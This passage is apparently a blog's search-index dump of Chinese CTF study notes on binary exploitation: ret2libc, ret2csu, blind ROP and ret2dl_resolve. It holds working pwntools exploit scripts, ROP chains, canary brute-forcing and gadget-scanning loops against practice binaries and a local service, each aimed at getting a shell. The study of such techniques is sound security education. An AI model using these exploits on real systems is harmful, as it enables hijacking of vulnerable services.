./rop --string \"/bin/sh\" 0x080be408 : /bin/sh  ROPgadget --binary ./rop |ag \"int 0x80\" 0x08049421 : int 0x80   有了这几个gadget之后，我们按照顺序来排布数据，最后再进行系统调用即可getshell。   pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 int_0x80 = 0x08049421 binsh = 0x80be408 payload = flat([cyclic(112), pop_edx_ecx_ebx_ret, 0, 0, binsh, pop_eax_ret, 0xb, int_0x80]) #payload = shellcode_x64.ljust(24, '\\x90') + p64(ret_addr) s.sendline(payload) s.recv() s.interactive()      ret2libc   ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。   第一题   我们需要的一般有2个地址，对于第一个题来说，system和参数地址都提供了，一个在plt表中，一个在bss段中。所以很简单。      objdump -d -j .plt -M intel ./ret2libc1|ag @plt 08048430 &lt;gets@plt&gt;: 08048440 &lt;time@plt&gt;: 08048450 &lt;puts@plt&gt;: 08048460 &lt;system@plt&gt;: 08048470 &lt;__gmon_start__@plt&gt;: 08048480 &lt;srand@plt&gt;: 08048490 &lt;__libc_start_main@plt&gt;: 080484a0 &lt;setvbuf@plt&gt;: 080484b0 &lt;rand@plt&gt;: 080484c0 &lt;__isoc99_scanf@plt&gt;:  ROPgadget --binary ./ret2libc1 --string \"/bin/sh\" 0x08048720 : /bin/sh   脚本如下所示：   system_plt = 0x08048460 binsh_addr = 0x08048720 payload = flat([cyclic(112), system_plt, 0xdeadbeef, binsh_addr]) #payload = shellcode_x64.ljust(24, '\\x90') + p64(ret_addr) s.sendline(payload) s.recv() s.interactive()      第二题   和第一题差不多，只不过没有bash字符串了，需要手动写入进去，由于aslr的不确定性。我使用的方法布局好栈帧，劫持返回地址到got表中的gets，然后再调用gets，将sh字符串写入bss段中。然后再控制返回地址到system@plt。   ROPgadget --binary ./ret2libc2 --only 'pop|ret' 0x0804872f : pop ebp ; ret   脚本如下，和第一题差不多，只不过需要注意的是，由于要连续调用2次函数，其中需要一次rop，才能成功布局好栈帧，否则会调用失败。   buf_addr = 0x0804a068 pop_addr = 0x0804872f  payload = flat([cyclic(112), elf.plt['gets'], pop_addr, buf_addr])  payload +=flat([elf.plt['system'],0xdeadbeef, buf_addr]) #payload = shellcode_x64.ljust(24, '\\x90') + p64(ret_addr) s.sendline(payload) s.send(\"/bin/sh\\x00\") s.recv() s.interactive()      第三题   在第二题的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。      system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。   即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下   https://github.com/niklasb/libc-database   所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。   那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。   我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme      https://github.com/lieanu/LibcSearcher   此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。   这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下      泄露 __libc_start_main 地址   获取 libc 版本   获取 system 地址与 /bin/sh 的地址   再次执行源程序   触发栈溢出执行 system(‘/bin/sh’)   s.recv() payload = flat([cyclic(112), elf.plt['puts'], elf.sym['_start'], elf.got['__libc_start_main']]) s.sendline(payload) libc.address = u32(s.recv(4))- libc.symbols['__libc_start_main'] log.success(\"libc.address -&gt; {:#x}\".format(libc.address)) assert libc.address &amp; 0xfff == 0  s.recv() payload = flat([cyclic(112), libc.sym['system'], 0xdeadbeef, next(libc.search(\"/bin/sh\"))]) s.sendline(payload) #s.recv() s.interactive()      当然我之后试了下神器one_gadget，作为217战队的成员开发的一建getshell工具，命令如下。      它也提示了我们需要getshell的约束条件，我用的是最后一个，即esi指向libc的GOT表首地址，eax需要为0。由于这个题，第二次gets函数结束后eax就是0，这一个条件就满足了，然后要设置esi的值，这里不是很懂，但是经过调试发现esi的值就是GOT表的首地址，可能是调用got表中的函数之后就会将其值设置成该地址，具体不清楚。然后我们直接返回到libc首地址加偏移量即可。   第四题   练习题差不多的，主要是最后one_gadget的地址不一样，因为eax不是0，这样我们可以通过设置[esp]=0来getshell。   s.recvuntil('The address') binsh_addr = int(s.recvuntil('\\n', drop=True)[-10:], 16) puts_got = int(s.recvuntil('\\n', drop=True)[-10:], 16) libc.address = puts_got - libc.symbols['puts'] log.success(\"libc.address -&gt; {:#x}\".format(libc.address))  payload = flat([cyclic(32), 0x6985c + libc.address, 0]) s.sendline(payload) s.interactive()  ","categories": [],
        "tags": ["pwn"],
        "url": "https://zjgcjy.github.io/posts/2019-03/Pwnit-3.html",
        "teaser":null},{
        "title": "Pwnit 4",
        "excerpt":"   pwn学习资料，来自ctf-wiki。 中级 ROP      ret2csu   在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)         从+90 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。   从 +64 到 +70，我们可以将 r15 赋给 rdx, 将 r14 赋给 rsi，将 r13d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。   从 +77 到 +86，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 == rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。   以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。这个题就是个简单的栈溢出，但是要ret2libc的话，需要leak info，由于只有read和write函数，x64位下用write来打印GOT表需要3个参数，这就要我们控制rdi，rsi和rdx。而我们用rop工具并不能找到这么多gadget。      所以我们可以使用lib2csu来控制regs，继而ret2libc。脚本如下，csu用来进行ret2csu，参数用于glibc2.28，其实和一般的ret2libc差不多，区别是没有用来rdx的gadget。   # r12(r13, r14, r15) -&gt; ret def csu(offset, r12, r13, r14, r15, ret, rbx = 0, rbp = 1):   csu_first = 0x04011ea   csu_second = 0x04011d0   # First step   # pop rbx, rbp, r12, r13, r14, r15          # Second step     # rdx = r15     # rsi = r14     # rdi = edi = r13d     # rbx = 0, rbp = 1     # call r12 \tpayload = 'a' * offset + p64(csu_first) \tpayload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) \tpayload += p64(csu_second) \tpayload += 'b' * 0x38 \tpayload += p64(ret) \ts.sendline(payload) \tsleep(0.5)  def main(): \ts.recv() \tcsu(136, elf.got['write'], 1, elf.got['write'], 8, elf.sym['main']) \tlibc.address = u64(s.recv(8)) - libc.symbols['write'] \tlog.success(\"libc.address -&gt; {:#x}\".format(libc.address)) \t \ts.recv() \ts.sendline(flat([cyclic(136), libc.address + 0x45254], 0,0,0,0,0,0,0)) \t#s.recv() \ts.interactive()   在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法   改进 1 - 提前控制 RBX 与 RBP：可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。   改进 2 - 多次利用：其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件      漏洞可以被多次触发   在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。   当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。   总结一下，在上面的 libc_csu_init 中我们主要利用了以下寄存器      利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。   利用中间部分的代码控制了 rdx，rsi，edi。   ret2reg      查看溢出函返回时哪个寄存值指向溢出缓冲区空间   然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址   reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)   BROP   BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。      源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。   服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。   在 BROP 中，基本的遵循的思路如下      判断栈溢出长度            暴力枚举           Stack Reading            获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。           Blind ROP            找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。           Build the exploit            利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。           栈溢出长度   首先检测输入长度来进行栈溢出。   def getBufferLength():     i = 1     while True:         try:             p = remote('127.0.0.1', 1111)             p.recvuntil('\\n')             p.send(i * 'a')             output = p.recv()             p.close()             if not output.startswith('No password'):                 return i - 1             else:                 i += 1         except EOFError:             p.close()             return i - 1  print getBufferLength()      canary保护   然后要绕过canary的保护，这里就采用爆破的方式，由于canary的最低为都是0，32位程序只要爆破256*3次就行了。代码如下，没运行过，应该没问题：   for i in xrange(256):     s = remote('127.0.0.1', 1234) \ts.recv() \t# offset = 50 \tpayload = \"a\"*50+'\\x00'+chr(i) \ts.send(payload) \ttry: \t\tprint i \t\tout = s.recv() \texcept EOFError: \t\ts.close() \telse: \t\tprint out \t\tprint '*'*8+ hex(i)+ '*'*8 \t\ts.close()   在爆破完canary之后，我们就要控制返回地址来泄露整个程序，一般通过wrtie和puts函数，而puts会截断，write函数需要的参数又多，两者都不简单，这里使用write函数进行介绍，而最简单的执行 write 函数的方法就是构造系统调用。   pop rdi; ret # socket pop rsi; ret # buffer pop rdx; ret # length pop rax; ret # write syscall number syscall   但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为找 write 的方式来获取。write函数一般可以在plt表中找到，三个参数rdi，rsi，rdx的前两个可以在libc2csu中，而在程序中rdx一般不为0，因为这个参数是用来输出长度的。所以我们先要进行寻找gadgets，然后再去寻找plt表中的各个函数。   寻找 GADGETS   首先，我们来想办法寻找 gadgets。此时，由于不知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。而当我们控制程序的返回地址时，一般有以下几种情况。      程序直接崩溃   程序运行一段时间后崩溃   程序一直运行而并不崩溃   为了寻找合理的 gadgets，我们首先要找到一个可以使程序保持一个状态的地址，称为stop gadget，当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。他的意思就如下图所示，当我们在进行gadget测试时候，假如我们测试到了gadget，ret指令会将栈中的地址作为返回地址，也就是说，如果我们不在进行测试的gadget后面附上stop gadget，程序的运行状态是不可知的，我们必须使用一个可控的程序状态。比如说再次跳转到主函数，这样我们又能重复这一次gadget的测试操作，进而找到我们需要的gadget。      检测代码如下：   # log in file def log_in_file(addr):     f = open('gadget.txt','a')     f.write(\"gadget addr : %#x\\n\" % addr)     f.close()  def get_hang_addr(addr):     p = remote('127.0.0.1',1111)     payload = \"A\" * 72 + p64(addr)     p.recvuntil('\\n')     p.send(payload)     try:         output = p.recv()         log.info(\"alive ! at 0x%x\" % addr)         log_in_file(addr)         p.close()     except EOFError as e:          p.close()         log.info(\"dead connection! at 0x%x\" % addr)     else:     \tp.close()     \tlog.info(\"else at 0x%x\" % addr)  addr = 0x00400000 while True: \tget_hang_addr(addr) \taddr+=1      不放心的话，我们可以对检测出来的gadget进行手工检测，一般都选用靠近主函数入口的地址，这样可以让程序再运行一次。   这里论文中定义了3种状态：      Probe 探针，位于ret地址处，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。   Stop ret地址后面经过预期几个gadget处的位置，不会使得程序崩溃的 stop gadget 的地址。   Trap stop gadget之前和之后的部分填充的内容，可以导致程序崩溃的地址。   我们可以通过在栈上摆放不同顺序的Stop 与 Trap 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子      probe,stop,traps(traps,traps,…)            我们通过程序崩溃与否 ，可以找到不会对栈进行 pop 操作的 gadget，如                    ret           xor eax,eax; ret                           probe,trap,stop,traps            我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如                    pop rax; ret           pop rdi; ret                           probe, trap, trap, trap, trap, trap, trap, stop, traps            我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的，，这里一般来说会遇到两处比较有意思的地方                    plt 处不会崩，，           _start 处不会崩，相当于程序重新执行。                           # get ret2csu_addr def get_gadgets_addr(stop_gadget): \taddress = 0x400750 \twhile True: \t\tp = remote('127.0.0.1',1111) \t\tpayload = \"A\" * 72 + p64(address) + p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) + p64(stop_gadget) \t\tp.recvuntil('\\n') \t\tp.send(payload) \t\ttry: \t\t    output = p.recv() \t\t    log.info(\"find gadgets at 0x%x\" % address) \t\t    p.close() \t\t    return \t\texcept EOFError as e:  \t\t    address += 1 \t\t    p.close() \t\t    log.info(\"dead connection! at 0x%x\" % address) \t\tp.close() \t\t     get_gadgets_addr(0x004006ad)         到这里我们就确定了stop gadget 和 ret2csu的地址。   寻找plt   如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 16 字节。而且，在每一个表项的 6 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。      此外，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。      ppppppr_addr = 0x4007aa gadget2 = ppppppr_addr - 0x1a gadget1 = ppppppr_addr pop_rid_ret = ppppppr_addr + 9 stop_gadget = 0x004006ad  # get puts@plt def get_puts_addr(length, rdi_ret, stop_gadget):     addr = 0x400000     while 1:         print hex(addr)         sh = remote('127.0.0.1', 1111)         sh.recvuntil('\\n')         payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)         sh.send(payload)         try:             content = sh.recv()             if content.startswith('\\x7fELF'):                 print 'find puts@plt addr: 0x%x' % addr                 return hex(addr)             sh.close()             addr += 1         except Exception as e:             sh.close()             addr += 1  print get_puts_addr(72, pop_rid_ret, stop_gadget) #puts_plt = 0x400560   在进行测试时，我得到了这么几个地址的值，为了确定哪个是真正的puts@plt的地址，我们可以进行分析。   0x400555 0x400557 0x40055c 0x40055e 0x40055f 0x400560 0x400561 0x400566      在puts@plt没有解析过时，plt表中函数第一条指令是跳转到对应的got表中，此时got表中存储的是plt表中的第二条指令，然后进行压栈，并跳转到plt表首，然后进入dl_resolve进行延时绑定，将函数地址写入got表中。   在puts@plt经过解析后，plt表中的函数地址第一条仍然不变，但是got表中的值变成了真正的函数值，所以此时会直接跳转到真正的函数入口处，不会再跳转到plt表中。   所以，基于elf文件的延时绑定机制，对于上面我们得到的疑似puts@plt的地址，前面几个肯定是在plt表项前面的指令，这样顺序执行指令也不有问题。而最后一个能真确执行puts的地址，肯定是属于puts@plt没有解析的情况下，程序进入plt表首，然后调用dl_resolve来调用puts函数，所以最后一个地址是puts@plt的第二条指令，即压栈操作，而压栈操作是在plt表函数的第二条位置，偏移量是6，所以我们就能得到正确的puts_plt的函数地址是0x400560。   dump文件   在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。 代码如下：   # dump file def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):     sh = remote('127.0.0.1', 1111)     payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)     sh.recvuntil('\\n')     sh.send(payload)     try:         data = sh.recv()         sh.close()         try:             data = data[:data.index(\"WelCome\")]         except Exception:             data = data         #print len(data)         if data == \"\":             data = '\\x00'         return data     except Exception:         sh.close()         return None  length = 72 brop_gadget = 0x4007aa stop_gadget = 0x4006AD puts_plt = 0x400560 addr = 0x400500 rdi_ret = brop_gadget + 9 result = \"\" while addr &lt; 0x400600:     print hex(addr)     data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)     if data is None:         continue     else:     \tif data == '\\x0a':     \t\tdata = '\\x00'         result += data     addr += len(data) with open('code', 'wb') as f:     f.write(result)      这说明，puts@got 的地址为 0x601018。然后我们进行整体的程序利用就行了。   exploit   #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * from sys import * import os   ip = '127.0.0.1'  port = 1111 context.log_level = 'debug' context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] s = remote(ip,port)  elf = ELF(\"./brop\") libc = elf.libc  #length = getbufferflow_length() length = 72 #stop_gadget = get_stop_addr(length) stop_gadget = 0x4006ad #ppppppr_addr = find_brop_gadget(length, stop_gadget) ppppppr_addr = 0x4007aa gadget1 = ppppppr_addr gadget2 = ppppppr_addr - 0x1a rdi_ret = ppppppr_addr + 9 #puts_plt = get_puts_plt(length, rdi_ret, stop_gadget) puts_plt = 0x400560 # puts_got = 0x601018 puts_got = 0x601018  #s = gdb.debug('./brop',''' #b main #''')  s.recv() payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget) s.send(payload) puts_addr = u64(s.recv(6).ljust(8, '\\x00')) log.success(\"puts_addr -&gt; {:#x}\".format(puts_addr))  libc.address = puts_addr - libc.symbols['puts'] log.success(\"libc address -&gt; {:#x}\".format(libc.address))  s.recv() payload = 'a' * length +  p64(libc.address+0x45254) + p64(0) * 7 s.send(payload) #s.recv() s.interactive()      ","categories": [],
        "tags": ["pwn"],
        "url": "https://zjgcjy.github.io/posts/2019-03/Pwnit-4.html",
        "teaser":null},{
        "title": "Pwnit 5",
        "excerpt":"   pwn学习资料，来自ctf-wiki。 高级 ROP ret2dl      _dl_runtime_resolve过程   在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用_dl_runtime_resolve(link_map_obj, reloc_index)，这里以 32 位为例（64 位类似），具体的过程如下。      根据 reloc_index 计算相应的重定位表项：**Elf32_Rel *reloc = JMPREL + reloc_index **   reloc_index 就是plt中表项的第二条指令，会将一个index压栈。   而如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：   typedef struct {  Elf32_Sword d_tag;  union {  Elf32_Word d_val;  Elf32_Addr d_ptr;  } d_un; } Elf32_Dyn;   其中，d_tag 的取值决定了该如何解释 d_un。而公式中的JMPREL 是.rel.plt的TAG。根据下面这个表格可知，d_ptr包含了plt表的首地址。                  名称       数值       d_un       可执行       共享 目标       说明                       DT_JMPREL       23       d_ptr       可选       可选       该类型的条目的 d_ptr 成员包含了过程链接表的地址，并且索引时应该会把该地址强制转换为对应的重定位表项类型的指针。把重定位表项分开有利于让动态链接器在进程初始化时忽略它们（开启了延迟绑定）。如果存在此成员，相关的 DT_PLTRELSZ 和 DT_PLTREL 必须也存在。              所以Elf32_Rel *reloc这个对象就指向.rel.plt的表项。这个结构体如下所示。   typedef struct {     Elf32_Addr        r_offset;     Elf32_Word       r_info; } Elf32_Rel;                  成员       说明                       r_offset       此成员给出了需要重定位的位置。对于一个可重定位文件而言，此值是从需要重定位的符号所在节区头部开始到将被重定位的位置之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是需要重定位的虚拟地址，一般而言，也就是说我们所说的 GOT 表的地址。                 r_info       此成员给出需要重定位的符号的符号表索引，以及相应的重定位类型。 例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，那么重定位使用 0 作为 “符号值”。此外，重定位类型是和处理器相关的。              当程序代码引用一个重定位项的重定位类型或者符号表索引时，这个索引是对表项的 r_info 成员应用 ELF32_R_TYPE 或者 ELF32_R_SYM 的结果。 也就是说 r_info 的高三个字节对应的值表示这个动态符号在. dynsym 符号表中的位置。   #define ELF32_R_SYM(i)    ((i)&gt;&gt;8) #define ELF32_R_TYPE(i)   ((unsigned char)(i)) #define ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))      根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)»8      比如我选取write函数，write函数的r_offset=0x0804a01c，也就是got表地址，即.got.plt节，而r_info=0x707。所以这时候索引就是7。      继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)»8)]      这一步就是查找.dynsym这个节就行了，因为索引已经给出了。      判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )   然后通过ELF32_R_TYPE(0x707)判断是不是 7，对应R_386_JUMP_SLOT。      通过.dynsym节，根据索引和项大小，得到字符串在.dynstr节的偏移量，然后得到符号write。   TODO:      if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)            if (sym-&gt;st_other) &amp; 3 == 0 )       判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。           得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。            uint16_t ndx = VERSYM[(reloc-&gt;r_info) » 8]       r_found_version *version = &amp;l-&gt;l_version[ndx]           根据 name 来寻找相应函数在库中的地址。            name = STRTAB + sym-&gt;st_name              延迟绑定   其他没什么好说的，讲了好几遍了，就上个图，记住got表首部的几个值，其中GOT[0]，指向的是.dynamic 节的首地址。而 GOT[1]，指向内部类型为 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息。最后 GOT[2]，指向动态装载器中 _dl_runtime_resolve 函数指针。而PLT[0]就是将GOT[1]压栈，PLT[1]就是跳转到GOT[2]的地址。      ret2_dl_runtime_resolve   那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下      控制程序执行 dl_resolve 函数            给定 Link_map 以及 index 两个参数。       当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。           控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。   伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。   伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。   此外，这个攻击成功的很必要的条件 dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。 dl_resolve 函数最后的解析根本上依赖于所给定的字符串。 注意：      符号版本信息            最好使得 ndx = VERSYM[(reloc-&gt;r_info) » 8] 的值为 0，以便于防止找不到的情况。           重定位表项            r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。           实现ret2dl   源代码：   #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt;  void vuln() {     char buf[100];     setbuf(stdin, buf);     read(0, buf, 256); } int main() {     char buf[100] = \"Welcome to XDCTF2015~!\\n\";      setbuf(stdout, buf);     write(1, buf, strlen(buf));     vuln();     return 0; }   编译成32位，只开个NX就行。 很明显就是个栈溢出，我们首先找到ret的offset，用gef的pattern就能发现是112了。 其实常规做法也能做，脚本如下：   rop = ROP(elf) rop.call('write', [1, elf.got['write'], 4]) rop.raw(elf.sym['_start'])  s.recv() s.send(flat([cyclic(112), rop.chain()])) libc.address = u32(s.recv(4)) - libc.symbols['write'] log.success(\"libc_base -&gt; {:#x}\".format(libc.address))  s.recv() one_shot = libc.address + 0x3e7d6 s.send(flat([cyclic(112), one_shot, '\\x00' * 0x38]))  s.interactive()   就是泄露got表，然后第二次one_gadget大法就行了。。      STAGE 1   但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到 bss 段来控制 write 函数。即主要分为两步：      将栈迁移到 bss 段。   控制 write 函数输出相应字符串。   rop = ROP(elf) stack_size = 0x800 base_stage = elf.bss() + stack_size rop.raw(cyclic(112)) rop.read(0, base_stage, 100) # stack pivoting, set esp = base_stage rop.migrate(base_stage) s.recv() s.send(rop.chain())  rop = ROP(elf) sh = \"/bin/sh\" rop.write(1, base_stage + 80, len(sh)) rop.raw(rop.generatePadding(0, 80 - len(rop.chain()))) rop.raw(sh) rop.raw(rop.generatePadding(80, 100 - len(rop.chain()))) s.send(rop.chain()) #s.recv()  s.interactive()      STAGE 2   在这一阶段，我们将会利用 dlresolve 相关的知识来控制程序执行 write 函数。这里我们主要是利用 plt[0] 中的相关指令，即 GOT[2] push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移。   rop = ROP(elf) stack_size = 0x800 base_stage = elf.bss() + stack_size rop.raw(cyclic(112)) rop.read(0, base_stage, 100) # stack pivoting, set esp = base_stage rop.migrate(base_stage) s.recv() s.send(rop.chain())   rop = ROP(elf) sh = \"/bin/sh\" plt0 = elf.get_section_by_name('.plt').header.sh_addr write_index = ((elf.plt['write'] - plt0) / 16 - 1) * 8 rop.raw(plt0) rop.raw(write_index) ## fake ret addr of write rop.raw(0xdeadbeef) rop.raw(1) rop.raw(base_stage + 80) rop.raw(len(sh)) rop.raw(rop.generatePadding(0, 80 - len(rop.chain()))) rop.raw(sh) rop.raw(rop.generatePadding(80, 100 - len(rop.chain()))) s.send(rop.chain()) #s.recv()  s.interactive()   STAGE 3   这一次，我们同样控制 dl_resolve 函数中的 index_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。脚本如下：   rop = ROP(elf) # 自定义stack size stack_size = 0x800 base_stage = elf.bss() + stack_size rop.raw(cyclic(112)) rop.read(0, base_stage, 100) # stack pivoting，esp = base_stage rop.migrate(base_stage) s.recv() s.send(rop.chain())  rop = ROP(elf) sh = \"/bin/sh\" plt0 = elf.get_section_by_name('.plt').header.sh_addr # push offset in PLT write_index = ((elf.plt['write'] - plt0) / 16 - 1) * 8 rel_plt = elf.get_section_by_name('.rel.plt') # ELF_REL：r_offset and r_info of write@plt r_offset = u32(rel_plt.data()[write_index:write_index + 4]) r_info = u32(rel_plt.data()[write_index + 4:write_index + 8]) # fake reloc = base_stage + 24 index_offset = base_stage + 24 - rel_plt.header.sh_addr  # args in dl_reslove rop.raw(plt0) rop.raw(index_offset) # fake ret of write rop.raw(0xdeadbeef) rop.raw(1) rop.raw(base_stage + 80) rop.raw(len(sh)) # fake reloc (offset 4*6=24) rop.raw(r_offset) rop.raw(r_info) rop.raw(rop.generatePadding(0, 80 - len(rop.chain()))) rop.raw(sh) rop.raw(rop.generatePadding(80, 100 - len(rop.chain()))) s.send(rop.chain()) #s.recv()  s.interactive()   最后结果如下，这次我们在 bss 段伪造了一个假的 write 的重定位项，仍然输出了对应的字符串。      STAGE 4   stage3 中，我们控制了重定位表项，但是重定位表项的内容与 write 原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。 首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607»8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238。         通过伪造fake .dynsym和fake .rel.plt  rop = ROP(elf) # stack size stack_size = 0x800 base_stage = elf.bss() + stack_size rop.raw(cyclic(112)) rop.read(0, base_stage, 100) # stack pivoting，esp = base_stage rop.migrate(base_stage) s.recv() s.send(rop.chain())  rop = ROP(elf) sh = \"/bin/sh\" plt0 = elf.get_section_by_name('.plt').header.sh_addr rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr dynsym = elf.get_section_by_name('.dynsym').header.sh_addr dynstr = elf.get_section_by_name('.dynstr').header.sh_addr  # fake sym fake_sym_addr = base_stage + 32 # size of item(Elf32_Symbol) of dynsym is 0x10 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)   fake_sym_addr = fake_sym_addr + align  # dynsym index of sym index_dynsym = (fake_sym_addr - dynsym) / 0x10 # fake item(write) of .dynsym fake_write_sym = flat([0x4c, 0, 0, 0x12])  